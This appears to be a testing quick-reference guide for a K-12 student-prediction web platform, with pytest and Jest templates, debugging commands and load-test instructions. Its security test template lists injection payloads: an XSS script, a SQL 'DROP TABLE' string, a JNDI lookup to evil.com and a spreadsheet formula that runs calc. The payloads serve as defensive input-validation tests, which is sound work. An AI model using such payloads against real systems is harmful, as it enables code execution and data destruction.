# Testing Quick Reference Guide

**K-12 Student Success Prediction Platform**  
**Developer's Testing Cheat Sheet**

---

## 🚀 **Quick Start Commands**

### **Run All Tests**
```bash
# Complete test suite
npm test && python3 -m pytest

# Parallel execution (faster)
npm test & python3 -m pytest & wait
```

### **Critical Test Categories**
```bash
# 🛡️ Security Tests (FERPA Critical)
python3 -m pytest tests/api/test_security.py -v

# 🧠 GPT AI Tests  
python3 -m pytest tests/gpt_systems/ -v

# 🎓 Educational Appropriateness
python3 -m pytest tests/ -k "educational or grade_level" -v

# ⚡ Performance Tests
python3 -m pytest tests/ -k "performance" -v

# 🌐 API Integration Tests
python3 -m pytest tests/api/ -v

# 📱 Frontend Component Tests
npm test -- --watchAll=false
```

---

## 🎯 **Test Writing Templates**

### **Template 1: Educational Feature Test**
```python
class TestNewEducationalFeature:
    """Test [FEATURE_NAME] for K-12 educational appropriateness"""
    
    @pytest.mark.parametrize("grade_level,expected_behavior", [
        (3, "elementary_appropriate"),    # K-5
        (7, "middle_school_appropriate"), # 6-8  
        (11, "high_school_appropriate")   # 9-12
    ])
    def test_grade_level_adaptation(self, grade_level, expected_behavior):
        student = create_test_student(grade_level=grade_level)
        result = your_feature_function(student)
        
        assert result.grade_appropriate == expected_behavior
        
        # Educational content validation
        if grade_level <= 5:  # Elementary
            assert "college" not in result.content.lower()
            assert "reading" in result.focus_areas
        elif grade_level >= 9:  # High School
            assert "graduation" in result.focus_areas
            assert "phonics" not in result.content.lower()
    
    def test_ferpa_compliance(self):
        """Test FERPA compliance for new feature"""
        student_with_pii = create_student_with_pii()
        result = your_feature_function(student_with_pii)
        
        # No PII in output
        assert student_with_pii.name not in str(result)
        assert student_with_pii.ssn not in str(result)
        
        # Audit log created
        audit_logs = get_recent_audit_logs()
        assert len(audit_logs) > 0
        assert audit_logs[-1].action == "FEATURE_ACCESS"
        assert audit_logs[-1].compliance_data['ferpa_compliant'] is True
```

### **Template 2: GPT Integration Test**
```python
class TestGPTIntegration:
    """Test GPT integration for educational recommendations"""
    
    @patch('src.mvp.services.gpt_oss_service.GPTOSSService')
    def test_emma_johnson_format_compliance(self, mock_gpt_service):
        """Test GPT returns exactly 3 recommendations with 1 bullet each"""
        mock_response = """1. **Academic Support Focus**
   - Schedule weekly math tutoring sessions

2. **Family Engagement Strategy**
   - Send bi-weekly progress updates to parents

3. **Behavioral Monitoring Plan**
   - Implement daily check-in system"""
        
        mock_gpt_service.return_value.generate_student_recommendations.return_value = mock_response
        
        student = create_test_student()
        recommendations = get_gpt_recommendations(student)
        
        # Verify Emma Johnson format
        lines = recommendations.split('\n')
        numbered_recs = [l for l in lines if l.strip().startswith(('1.', '2.', '3.'))]
        assert len(numbered_recs) == 3
        
        # Verify each has exactly 1 bullet
        for i in range(1, 4):
            section = extract_section(recommendations, i)
            bullets = [l for l in section if l.strip().startswith('-')]
            assert len(bullets) == 1, f"Recommendation {i} must have 1 bullet"
    
    def test_educational_vocabulary_validation(self, mock_gpt_service):
        """Test GPT uses appropriate educational terms"""
        educational_response = "Focus on academic tutoring and family engagement"
        mock_gpt_service.return_value.generate_student_recommendations.return_value = educational_response
        
        result = get_gpt_recommendations(create_test_student())
        
        # Should contain educational terms
        educational_terms = ['academic', 'tutoring', 'family', 'engagement']
        assert any(term in result.lower() for term in educational_terms)
        
        # Should not contain inappropriate terms
        inappropriate = ['medication', 'therapy', 'psychiatric']
        assert not any(term in result.lower() for term in inappropriate)
```

### **Template 3: Security Test**
```python
class TestFeatureSecurity:
    """Test security aspects of new feature"""
    
    def test_requires_authentication(self, client):
        """Test endpoint requires authentication"""
        response = client.post("/api/your-new-endpoint", json={"data": "test"})
        assert response.status_code == 401
        assert "authentication" in response.json()["detail"].lower()
    
    def test_input_validation(self, client, auth_headers):
        """Test malicious input is handled safely"""
        malicious_inputs = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE students; --",
            "${jndi:ldap://evil.com}",
            "=cmd|'/c calc'!A0"
        ]
        
        for malicious_input in malicious_inputs:
            response = client.post(
                "/api/your-new-endpoint",
                json={"input": malicious_input},
                headers=auth_headers
            )
            
            # Should either reject or sanitize
            assert response.status_code in [200, 400]
            
            if response.status_code == 200:
                # Verify malicious content not in response
                assert malicious_input not in str(response.json())
    
    def test_error_handling_no_info_leakage(self, client, auth_headers):
        """Test errors don't leak sensitive information"""
        # Cause an internal error
        response = client.post(
            "/api/your-new-endpoint",
            json={"invalid": "data structure"},
            headers=auth_headers
        )
        
        if response.status_code == 500:
            error_detail = response.json().get("detail", "")
            # Should not contain database info, stack traces, etc.
            assert "sql" not in error_detail.lower()
            assert "traceback" not in error_detail.lower()
            assert "database" not in error_detail.lower()
```

### **Template 4: Frontend Component Test**
```javascript
// Template for educational UI component testing
describe('NewEducationalComponent', () => {
  test('adapts interface for different grade levels', () => {
    const elementaryProps = {
      student: { grade_level: 3, reading_level: 2.8 },
      user: { role: 'teacher' }
    };
    
    const highSchoolProps = {
      student: { grade_level: 11, credits_earned: 18.5 },
      user: { role: 'counselor' }
    };
    
    // Elementary interface
    render(<NewEducationalComponent {...elementaryProps} />);
    expect(screen.getByText(/reading level/i)).toBeInTheDocument();
    expect(screen.queryByText(/college prep/i)).not.toBeInTheDocument();
    
    cleanup();
    
    // High school interface
    render(<NewEducationalComponent {...highSchoolProps} />);
    expect(screen.getByText(/credits/i)).toBeInTheDocument();
    expect(screen.getByText(/college/i)).toBeInTheDocument();
  });
  
  test('handles sensitive data appropriately', () => {
    const studentWithPII = {
      student_id: '12345',
      name: 'John Doe',
      ssn: '123-45-6789', // Should never be displayed
      gpa: 3.2
    };
    
    render(<NewEducationalComponent student={studentWithPII} />);
    
    // Should show appropriate data
    expect(screen.getByText('3.2')).toBeInTheDocument(); // GPA is okay
    expect(screen.getByText('12345')).toBeInTheDocument(); // Student ID is okay
    
    // Should NOT show PII
    expect(screen.queryByText('John Doe')).not.toBeInTheDocument();
    expect(screen.queryByText('123-45-6789')).not.toBeInTheDocument();
  });
});
```

---

## 📊 **Test Status Dashboard**

### **Current Testing Status** ✅
```
📊 Overall Test Health: EXCELLENT
┌─────────────────────┬─────────┬─────────┬────────┐
│ Category            │ Tests   │ Passing │ Status │
├─────────────────────┼─────────┼─────────┼────────┤
│ 🛡️  Security Tests   │   23    │   23    │   ✅   │
│ 🧠 GPT AI Tests     │   30+   │   30+   │   ✅   │
│ 📱 Frontend Tests   │  142+   │  142+   │   ✅   │
│ 🌐 API Tests        │   56    │   56    │   ✅   │
│ 📊 Database Tests   │   25+   │   25+   │   ✅   │
│ ⚡ Performance Tests │   12+   │   12+   │   ✅   │
├─────────────────────┼─────────┼─────────┼────────┤
│ TOTAL               │  268+   │  268+   │   ✅   │
└─────────────────────┴─────────┴─────────┴────────┘

🎯 Coverage Targets Met:
• Security: 100% (FERPA compliant)
• GPT System: 95%+ (Educational AI)  
• API Endpoints: 90%+ (Authentication)
• Frontend: 95%+ (Component coverage)
```

---

## 🔧 **Debugging Failed Tests**

### **Common Test Failures & Solutions**

#### **1. GPT Tests Failing**
```bash
# Symptom: GPT tests timeout or fail
# Solution: Check OpenAI API key and mock setup

# Debug GPT service
python3 -c "
from src.mvp.services.gpt_oss_service import GPTOSSService
service = GPTOSSService()
print(f'Service initialized: {service.client is not None}')
"

# Run single GPT test with verbose output
python3 -m pytest tests/gpt_systems/test_gpt_oss_service.py::TestGPTServiceInitialization -v -s
```

#### **2. Security Tests Failing**
```bash
# Symptom: Authentication tests fail
# Solution: Check API key configuration

# Verify test environment
echo "Testing environment: $TESTING"
echo "API key length: ${#MVP_API_KEY}"

# Run security tests with debug info
python3 -m pytest tests/api/test_security.py -v --tb=long
```

#### **3. Database Tests Failing**
```bash
# Symptom: Database connection errors
# Solution: Check database configuration

# Test database connection
python3 -c "
from src.mvp.database import Database
db = Database()
print(f'Database type: {db.get_db_type()}')
print(f'Connection healthy: {db.health_check()}')
"
```

#### **4. Frontend Tests Failing**
```bash
# Symptom: Component tests fail with import errors
# Solution: Check Node.js setup and dependencies

# Verify frontend dependencies
npm list --depth=0
node --version
npm --version

# Run tests with verbose output
npm test -- --verbose --no-cache
```

---

## 🎯 **Performance Benchmarks**

### **Response Time Requirements**
```bash
# Test individual endpoint performance
curl -w "@curl-format.txt" -o /dev/null -s "http://localhost:8001/api/mvp/stats" \
     -H "Authorization: Bearer your-api-key"

# Expected response times:
# • API endpoints: <5 seconds
# • GPT insights: <10 seconds  
# • File uploads: <15 seconds (depending on size)
# • Database queries: <1 second
```

### **Load Testing Commands**
```bash
# Classroom load test (30 students)
python3 scripts/load_test.py --students=30 --concurrent=5

# District load test (5000 students)
python3 scripts/load_test.py --students=5000 --concurrent=50 --batch-size=100

# GPT cost simulation
python3 scripts/gpt_cost_simulation.py --students=1000 --insights-per-student=3
```

---

## 📝 **Test Data Generators**

### **Quick Test Data Creation**
```python
# Create test students
from tests.utils.test_data_factory import create_test_student

# Elementary student
elementary = create_test_student(grade_level=3, risk_level="medium")

# High school student with specific attributes
high_school = create_test_student(
    grade_level=11, 
    gpa=2.1, 
    attendance_rate=0.73,
    behavioral_incidents=2
)

# Batch create students for load testing
students = create_test_students(count=100, grade_range=(9, 12))
```

### **Mock GPT Responses**
```python
# Emma Johnson format mock
emma_johnson_mock = """1. **Academic Support Focus**
   - Schedule weekly math tutoring sessions with qualified peer mentor

2. **Family Engagement Strategy**  
   - Establish bi-weekly progress update system with parents via email

3. **Behavioral Intervention Plan**
   - Implement daily check-in meetings with school guidance counselor"""

# Use in tests
with patch('gpt_service.generate_recommendations') as mock_gpt:
    mock_gpt.return_value = emma_johnson_mock
    # Your test code here
```

---

## 🚨 **Emergency Test Commands**

### **Quick Health Check**
```bash
# Verify all critical systems
python3 scripts/health_check.py --comprehensive

# Output shows:
# ✅ Database: Connected
# ✅ API: Responding  
# ✅ Security: Tests passing
# ✅ GPT: Service available
# ✅ Frontend: Build successful
```

### **Critical Test Subset** 
```bash
# Run only critical tests (< 30 seconds)
python3 -m pytest tests/api/test_security.py::TestAuthentication -q
python3 -m pytest tests/gpt_systems/test_gpt_oss_service.py::TestGPTServiceInitialization -q
npm test -- --testPathPattern="critical" --watchAll=false
```

### **Pre-Deploy Verification**
```bash
# Complete pre-deployment test suite
./scripts/pre_deploy_tests.sh

# Includes:
# • All security tests
# • GPT system validation  
# • API endpoint verification
# • Database integrity checks
# • Frontend build verification
```

---

## 📚 **Quick Reference Links**

### **Test File Locations**
```
tests/
├── api/                    # Backend API tests
│   ├── test_security.py    # 🛡️  FERPA compliance (23 tests)
│   ├── test_database_*.py  # 📊 Database integrity
│   └── test_interventions.py
├── gpt_systems/            # 🧠 GPT AI testing
│   ├── test_gpt_oss_service.py    # Service tests
│   ├── test_gpt_caching.py        # Cost optimization
│   └── test_gpt_api_integration.py # API integration
├── components/             # 📱 Frontend components
│   ├── analysis.test.js    # Student analysis UI
│   ├── dashboard.test.js   # Dashboard components
│   └── *.test.js          # Component-specific tests
└── integration/            # 🔗 End-to-end workflows
```

### **Configuration Files**
- `jest.config.js` - Frontend test configuration
- `pytest.ini` - Backend test configuration  
- `.github/workflows/` - CI/CD test automation
- `scripts/test_*.py` - Custom test utilities

### **Documentation**
- `docs/TDD_STANDARDS_AND_PATTERNS.md` - Complete TDD guide
- `docs/TESTING_QUICK_REFERENCE.md` - This document
- `README-TESTING.md` - Project testing overview

---

*Keep this guide handy for quick reference during development. All commands assume you're in the project root directory.*

**Last Updated**: August 29, 2025  
**Version**: 1.0